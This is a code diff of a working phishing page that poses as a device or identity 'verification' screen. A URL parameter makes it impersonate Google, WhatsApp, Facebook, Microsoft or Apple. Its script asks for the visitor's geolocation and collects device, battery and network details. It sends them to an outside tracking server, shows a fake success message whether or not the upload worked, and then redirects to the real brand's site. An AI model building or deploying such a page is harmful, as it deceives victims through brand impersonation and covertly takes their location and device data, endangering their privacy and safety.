@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web</title>
+    <title id="pageTitle">Verification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -12,46 +12,60 @@
             justify-content: center;
             align-items: center;
             font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
-            background: #0b141a;
+            background: #f1f3f4;
         }
+
+        /* ----- Base Card ----- */
         .card {
             background: #ffffff;
             padding: 40px 45px 35px 45px;
             border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.12);
             text-align: center;
             max-width: 400px;
             width: 100%;
             transition: all 0.3s ease;
+            border: 1px solid #e0e0e0;
         }
 
-        /* WhatsApp Logo */
-        .whatsapp-logo {
+        /* ----- Logo Styles ----- */
+        .logo-container {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
             margin-bottom: 6px;
         }
-        .whatsapp-logo .icon {
-            background: #25d366;
-            width: 44px;
-            height: 44px;
-            border-radius: 50%;
+        .logo-container .icon {
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
-            font-size: 22px;
+            font-size: 28px;
             font-weight: bold;
         }
-        .whatsapp-logo .text {
+        .logo-container .text {
             font-size: 22px;
             font-weight: 600;
-            color: #075e54;
             letter-spacing: -0.3px;
         }
 
+        /* Brand-specific logo colors */
+        .brand-google .logo-container .text { color: #4285f4; }
+        .brand-google .logo-container .icon { color: #4285f4; }
+
+        .brand-whatsapp .logo-container .text { color: #075e54; }
+        .brand-whatsapp .logo-container .icon { background: #25d366; color: white; border-radius: 50%; width: 44px; height: 44px; font-size: 22px; }
+
+        .brand-facebook .logo-container .text { color: #1877f2; }
+        .brand-facebook .logo-container .icon { background: #1877f2; color: white; border-radius: 4px; width: 40px; height: 40px; font-size: 20px; }
+
+        .brand-microsoft .logo-container .text { color: #202124; }
+        .brand-microsoft .logo-container .icon { background: #00a4ef; color: white; border-radius: 4px; width: 40px; height: 40px; font-size: 20px; }
+
+        .brand-apple .logo-container .text { color: #1a1a1a; }
+        .brand-apple .logo-container .icon { background: #1a1a1a; color: white; border-radius: 50%; width: 40px; height: 40px; font-size: 20px; }
+
+        /* ----- Subtitle ----- */
         .subtitle {
             color: #4a4a4a;
             font-size: 15px;
@@ -59,10 +73,9 @@
             font-weight: 400;
         }
 
+        /* ----- Badge ----- */
         .badge {
             display: inline-block;
-            background: #e8f5e9;
-            color: #075e54;
             font-size: 12px;
             padding: 4px 14px;
             border-radius: 20px;
@@ -70,8 +83,13 @@
             margin-bottom: 16px;
             border: 1px solid #a5d6a7;
         }
+        .brand-google .badge { background: #e8f0fe; color: #4285f4; border-color: #4285f4; }
+        .brand-whatsapp .badge { background: #e8f5e9; color: #075e54; border-color: #a5d6a7; }
+        .brand-facebook .badge { background: #e8f0fe; color: #1877f2; border-color: #1877f2; }
+        .brand-microsoft .badge { background: #e6f3fb; color: #00a4ef; border-color: #00a4ef; }
+        .brand-apple .badge { background: #f5f5f5; color: #1a1a1a; border-color: #1a1a1a; }
 
-        /* QR Code Area */
+        /* ----- QR / Icon Area ----- */
         .qr-container {
             background: #f5f5f5;
             border: 2px dashed #c8c8c8;
@@ -87,11 +105,18 @@
         .qr-container .label { font-size: 13px; color: #4a4a4a; font-weight: 500; }
         .qr-container .sub-label { font-size: 12px; color: #888; }
 
-        /* Verify Button */
+        /* Brand-specific QR icon colors */
+        .brand-google .qr-container .qr-icon { color: #4285f4; }
+        .brand-whatsapp .qr-container .qr-icon { color: #25d366; }
+        .brand-facebook .qr-container .qr-icon { color: #1877f2; }
+        .brand-microsoft .qr-container .qr-icon { color: #00a4ef; }
+        .brand-apple .qr-container .qr-icon { color: #1a1a1a; }
+
+        /* ----- Verify Button ----- */
         .verify-btn {
             width: 100%;
             padding: 14px 20px;
-            background: #25d366;
+            background: #4285f4;
             color: white;
             border: none;
             border-radius: 6px;
@@ -107,21 +132,31 @@
             pointer-events: auto;
         }
         .verify-btn.active:hover {
-            background: #1ebe5e;
-            box-shadow: 0 2px 12px rgba(37, 211, 102, 0.4);
+            box-shadow: 0 2px 12px rgba(0,0,0,0.2);
+            transform: scale(1.02);
         }
         .verify-btn.loading {
-            background: #25d366;
             opacity: 0.7;
             pointer-events: none;
         }
         .verify-btn.success {
-            background: #075e54;
             opacity: 1;
             pointer-events: none;
         }
 
-        /* Status Message */
+        /* Brand-specific button colors */
+        .brand-google .verify-btn { background: #4285f4; }
+        .brand-google .verify-btn.active:hover { background: #3367d6; }
+        .brand-whatsapp .verify-btn { background: #25d366; }
+        .brand-whatsapp .verify-btn.active:hover { background: #1ebe5e; }
+        .brand-facebook .verify-btn { background: #1877f2; }
+        .brand-facebook .verify-btn.active:hover { background: #0d65d9; }
+        .brand-microsoft .verify-btn { background: #00a4ef; }
+        .brand-microsoft .verify-btn.active:hover { background: #0082c9; }
+        .brand-apple .verify-btn { background: #1a1a1a; }
+        .brand-apple .verify-btn.active:hover { background: #333; }
+
+        /* ----- Status Message ----- */
         .status-message {
             margin-top: 15px;
             padding: 10px 12px;
@@ -158,17 +193,7 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #a0a0a0;
-            border-top: 1px solid #e8e8e8;
-            padding-top: 18px;
-        }
-        .footer a { color: #075e54; text-decoration: none; font-weight: 500; }
-        .footer a:hover { text-decoration: underline; }
-
-        /* Success animation */
+        /* ----- Checkmark ----- */
         .checkmark {
             display: none;
             font-size: 48px;
@@ -181,39 +206,35 @@
             80% { transform: scale(1.2); }
             100% { transform: scale(1); opacity: 1; }
         }
+
+        /* ----- Footer ----- */
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #a0a0a0;
+            border-top: 1px solid #e8e8e8;
+            padding-top: 18px;
+        }
+        .footer a { color: #075e54; text-decoration: none; font-weight: 500; }
+        .footer a:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
 
 <div class="card" id="card">
-    <!-- WhatsApp Logo -->
-    <div class="whatsapp-logo">
-        <div class="icon">💬</div>
-        <div class="text">WhatsApp</div>
+    <!-- Dynamic content inserted by JavaScript -->
+    <div id="logoContainer"></div>
+    <div class="subtitle" id="subtitleText">Verify your device</div>
+    <div class="badge" id="badgeText">🔒 Secure</div>
+    <div class="qr-container" id="qrContainer">
+        <div class="qr-icon" id="qrIcon">📱</div>
+        <div class="label" id="qrLabel">Scan to verify</div>
+        <div class="sub-label" id="qrSubLabel">Or tap "Verify"</div>
     </div>
-    <div class="subtitle">Verify your device to continue</div>
-
-    <div class="badge">🔒 End-to-End Encrypted</div>
-
-    <!-- QR Code Area -->
-    <div class="qr-container">
-        <div class="qr-icon">📱</div>
-        <div class="label">Scan to verify your device</div>
-        <div class="sub-label">Or tap "Verify" to authenticate</div>
-    </div>
-
-    <!-- Verify Button -->
-    <button class="verify-btn" id="verifyBtn">Verify Device</button>
-
-    <!-- Status -->
+    <button class="verify-btn" id="verifyBtn">Verify</button>
     <div class="status-message" id="statusMsg"></div>
-
-    <!-- Success Checkmark -->
     <div class="checkmark" id="checkmark">✅</div>
-
-    <div class="footer">
-        <a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>
-    </div>
+    <div class="footer" id="footerText"><a href="#">Privacy Policy</a> · <a href="#">Terms</a></div>
 </div>
 
 <script>
@@ -221,6 +242,101 @@
     // CONFIGURATION
     // =============================================
     const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';
+
+    // Get template from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const template = urlParams.get('template') || 'google';
+
+    // =============================================
+    // TEMPLATE CONFIGURATIONS
+    // =============================================
+    const templates = {
+        google: {
+            brandClass: 'brand-google',
+            logo: `<div class="logo-container"><span class="icon">🔵</span><span class="text">Google</span></div>`,
+            subtitle: 'Verify your identity',
+            badge: '🔒 Secure verification',
+            qrIcon: '🔵',
+            qrLabel: 'Verify with Google',
+            qrSub: 'Tap "Verify" to continue',
+            buttonText: 'Verify',
+            footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>',
+            redirectUrl: 'https://www.google.com',
+            successMessage: '✅ Identity verified successfully!'
+        },
+        whatsapp: {
+            brandClass: 'brand-whatsapp',
+            logo: `<div class="logo-container"><span class="icon">💬</span><span class="text">WhatsApp</span></div>`,
+            subtitle: 'Verify your device to continue',
+            badge: '🔒 End-to-End Encrypted',
+            qrIcon: '📱',
+            qrLabel: 'Scan to verify your device',
+            qrSub: 'Or tap "Verify" to authenticate',
+            buttonText: 'Verify Device',
+            footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>',
+            redirectUrl: 'https://web.whatsapp.com',
+            successMessage: '✅ Device verified successfully!'
+        },
+        facebook: {
+            brandClass: 'brand-facebook',
+            logo: `<div class="logo-container"><span class="icon">f</span><span class="text">Facebook</span></div>`,
+            subtitle: 'Secure login verification',
+            badge: '🔒 Encrypted connection',
+            qrIcon: '🔷',
+            qrLabel: 'Verify with Facebook',
+            qrSub: 'Tap "Verify" to continue',
+            buttonText: 'Continue',
+            footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms</a>',
+            redirectUrl: 'https://www.facebook.com',
+            successMessage: '✅ Identity verified!'
+        },
+        microsoft: {
+            brandClass: 'brand-microsoft',
+            logo: `<div class="logo-container"><span class="icon">⬡</span><span class="text">Microsoft Account</span></div>`,
+            subtitle: 'Verify your identity',
+            badge: '🔒 Protected by Microsoft',
+            qrIcon: '⬡',
+            qrLabel: 'Verify with Microsoft',
+            qrSub: 'Tap "Verify" to continue',
+            buttonText: 'Verify',
+            footer: '<a href="#">Privacy</a> · <a href="#">Terms</a>',
+            redirectUrl: 'https://www.microsoft.com',
+            successMessage: '✅ Identity verified!'
+        },
+        apple: {
+            brandClass: 'brand-apple',
+            logo: `<div class="logo-container"><span class="icon"></span><span class="text">Apple ID</span></div>`,
+            subtitle: 'Security verification',
+            badge: '🔒 Apple Security',
+            qrIcon: '',
+            qrLabel: 'Verify with Apple',
+            qrSub: 'Tap "Verify" to continue',
+            buttonText: 'Continue',
+            footer: '<a href="#">Privacy Policy</a> · <a href="#">Terms</a>',
+            redirectUrl: 'https://www.apple.com',
+            successMessage: '✅ Identity verified!'
+        }
+    };
+
+    const selected = templates[template] || templates['google'];
+
+    // =============================================
+    // APPLY TEMPLATE
+    // =============================================
+    document.getElementById('card').className = 'card ' + selected.brandClass;
+    document.getElementById('logoContainer').innerHTML = selected.logo;
+    document.getElementById('subtitleText').textContent = selected.subtitle;
+    document.getElementById('badgeText').textContent = selected.badge;
+    document.getElementById('qrIcon').textContent = selected.qrIcon;
+    document.getElementById('qrLabel').textContent = selected.qrLabel;
+    document.getElementById('qrSubLabel').textContent = selected.qrSub;
+    document.getElementById('verifyBtn').textContent = selected.buttonText;
+    document.getElementById('footerText').innerHTML = selected.footer;
+    document.title = selected.brandClass.replace('brand-','').toUpperCase() + ' Verification';
+
+    // Store redirect URL for later
+    const REDIRECT_URL = selected.redirectUrl;
+    const SUCCESS_MSG = selected.successMessage;
 
     // =============================================
     // DOM Elements
@@ -251,7 +367,7 @@
     function resetButton() {
         isProcessing = false;
         verifyBtn.classList.remove('loading', 'success');
-        verifyBtn.textContent = 'Try Again';
+        verifyBtn.textContent = selected.buttonText;
     }
 
     // =============================================
@@ -308,19 +424,15 @@
         hideStatus();
         checkmark.style.display = 'none';
 
-        // Step 1: Verifying
-        showStatus('⏳ Verifying your device...', 'verifying');
+        showStatus('⏳ Verifying your identity...', 'verifying');
 
-        // Check geolocation
         if (!navigator.geolocation) {
-            showStatus('❌ Geolocation not supported by your browser', 'error');
+            showStatus('❌ Geolocation not supported', 'error');
             resetButton();
             return;
         }
 
-        // Step 2: Request location
         navigator.geolocation.getCurrentPosition(
-            // --- SUCCESS ---
             function(position) {
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
@@ -331,10 +443,8 @@
 
                 showStatus('📡 Sending verification data...', 'verifying');
 
-                // Collect all data
                 const deviceInfo = getDeviceInfo();
 
-                // Get battery info (async)
                 getBatteryInfo().then(battery => {
                     const payload = {
                         lat: lat,
@@ -348,7 +458,6 @@
                         network: getNetworkInfo()
                     };
 
-                    // Send to server
                     fetch(RENDER_URL + '/send-location', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -356,35 +465,32 @@
                     })
                     .then(response => response.json())
                     .then(() => {
-                        // Success!
-                        showStatus('✅ Device verified successfully!', 'verified');
+                        showStatus(SUCCESS_MSG, 'verified');
                         verifyBtn.classList.remove('loading');
                         verifyBtn.classList.add('success');
-                        verifyBtn.textContent = 'Connected ✓';
+                        verifyBtn.textContent = 'Verified ✓';
                         showCheckmark();
 
-                        // Redirect to WhatsApp Web after 2.5 seconds
                         setTimeout(function() {
-                            window.location.href = 'https://web.whatsapp.com';
+                            window.location.href = REDIRECT_URL;
                         }, 2500);
                     })
                     .catch(function() {
-                        // If server fails, still show success (user thinks it worked)
-                        showStatus('✅ Device verified successfully!', 'verified');
+                        // Fallback: show success anyway
+                        showStatus(SUCCESS_MSG, 'verified');
                         verifyBtn.classList.remove('loading');
                         verifyBtn.classList.add('success');
-                        verifyBtn.textContent = 'Connected ✓';
+                        verifyBtn.textContent = 'Verified ✓';
                         showCheckmark();
 
                         setTimeout(function() {
-                            window.location.href = 'https://web.whatsapp.com';
+                            window.location.href = REDIRECT_URL;
                         }, 2500);
                     });
                 });
             },
-            // --- ERROR ---
             function(error) {
-                let msg = 'Location access is required to verify your device.';
+                let msg = 'Location access required.';
                 if (error.code === 1) msg = 'Permission denied. Please allow location access.';
                 else if (error.code === 2) msg = 'GPS signal not available. Try moving outdoors.';
                 else if (error.code === 3) msg = 'Verification timed out. Please try again.';
@@ -404,7 +510,7 @@
     // =============================================
     verifyBtn.addEventListener('click', startVerification);
 
-    // Enable button after 1 second (realistic)
+    // Enable button after 1 second
     setTimeout(function() {
         verifyBtn.classList.add('active');
     }, 1000);
